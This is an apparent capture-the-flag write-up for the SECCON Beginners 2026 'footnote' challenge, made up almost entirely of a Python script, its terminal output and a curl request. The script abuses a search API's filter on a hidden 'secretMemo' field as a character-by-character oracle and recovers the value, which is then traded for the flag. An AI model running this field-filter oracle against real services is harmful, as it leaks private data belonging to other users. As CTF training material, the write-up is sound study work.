# search.py

```python
┌──(kali㉿kali)-[~/CTF/Seccon_Biginners_2026/footnote]
└─$ cat search.py    
import requests

URL = "http://footnote.beginners.seccon.games:44566/api/articles/search"
CHARS = "0123456789abcdef"

memo = ""

while len(memo) < 12:
    found = False

    for c in CHARS:
        candidate = memo + c

        r = requests.get(
            URL,
            params={
                "field": "author.profile.secretMemo",
                "op": "startsWith",
                "value": candidate,
            },
        ).json()

        if r["count"] == 2:
            memo = candidate
            print("[+] ", memo)
            found = True
            break

    if not found:
        print("[-] no match")
        break

print("SECRET_MEMO =", memo)
```

```zsh
┌──(kali㉿kali)-[~/CTF/Seccon_Biginners_2026/footnote]
└─$ python3 search.py                                                                             
[+]  b
[+]  b2
[+]  b2f
[+]  b2fa
[+]  b2fa6
[+]  b2fa6b
[+]  b2fa6b5
[+]  b2fa6b56
[+]  b2fa6b560
[+]  b2fa6b5600
[+]  b2fa6b56005
[+]  b2fa6b560059
SECRET_MEMO = b2fa6b560059
```

```zsh
┌──(kali㉿kali)-[~/CTF/Seccon_Biginners_2026/footnote]
└─$ curl -s -X POST \
'http://footnote.beginners.seccon.games:44566/api/claim' \
-H 'Content-Type: application/json' \
-d '{"memo":"b2fa6b560059"}'
{"flag":"ctf4b{r00t_f13lds_4r3_n0t_en0ugh}"}  
```